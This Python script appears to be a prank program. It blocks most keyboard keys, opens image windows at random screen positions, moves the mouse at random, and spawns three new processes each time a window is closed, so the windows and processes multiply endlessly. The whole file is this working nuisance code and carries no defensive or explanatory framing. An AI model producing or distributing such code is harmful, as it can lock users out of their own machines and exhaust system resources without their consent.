import tkinter as tk
from PIL import Image, ImageTk
from multiprocessing import Process, freeze_support
from random import randint
import pyautogui as p
import keyboard
import sys


def showImage(i):
    img = Image.open("baby.webp")
    window = tk.Tk()
    window.title("?")
    tk_img = ImageTk.PhotoImage(img)
    label = tk.Label(window, image=tk_img)
    label.pack()

    x = randint(1, 1920 - 459)
    y = randint(1, 1050 - 466)

    window.geometry(f"+{x}+{y}")
    window.mainloop()
    # Call jerry again so that it will open more windows every time it is closed out
    jerry()


def jerry():
    processes = []
    for i in range(3):
        process = Process(target=showImage, args=(i + 1,))
        process.start()
        processes.append(process)
    for i in range(3):
        x = randint(1, 1920)
        y = randint(1, 1080)
        p.moveTo(x, y, 1)
    process.join()



def main():
    jerry()


if __name__ == '__main__':
    freeze_support()
    for i in range(150):
        keyboard.block_key(i)
    main()
